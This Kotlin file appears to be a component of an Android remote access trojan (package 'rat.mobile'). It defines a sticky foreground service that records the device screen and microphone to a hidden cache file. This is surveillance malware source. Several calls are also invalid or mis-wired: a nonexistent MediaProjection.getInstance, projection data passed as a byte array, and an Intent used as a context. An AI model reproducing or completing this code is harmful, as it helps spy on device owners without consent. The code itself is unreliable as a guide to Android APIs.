package rat.mobile

import android.app.Service
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: String? = null

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
        val data = intent?.getByteArrayExtra("data") ?: null

        if (resultCode != -1 && data != null) {
            mediaProjection = MediaProjection.getInstance(resultCode, data)
            startRecording()
        }

        return START_STICKY
    }

    private fun startRecording() {
        outputFile = externalCacheDir.path + "/screen_record_" + System.currentTimeMillis() + ".mp4"
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(outputFile)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoSize(720, 1280)
            setVideoFrameRate(30)
            setVideoEncodingBitRate(3500000)
            prepare()
            start()
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        if (mediaRecorder != null) {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
        }
        if (mediaProjection != null) {
            mediaProjection?.stop()
            mediaProjection = null
        }
    }

    companion object {
        fun startService(context: Intent, resultCode: Int, data: ByteArray) {
            val intent = Intent(context, ScreenCaptureService::class.java)
            intent.putExtra("resultCode", resultCode)
            intent.putExtra("data", data)
            context.startForegroundService(intent)
        }
    }
}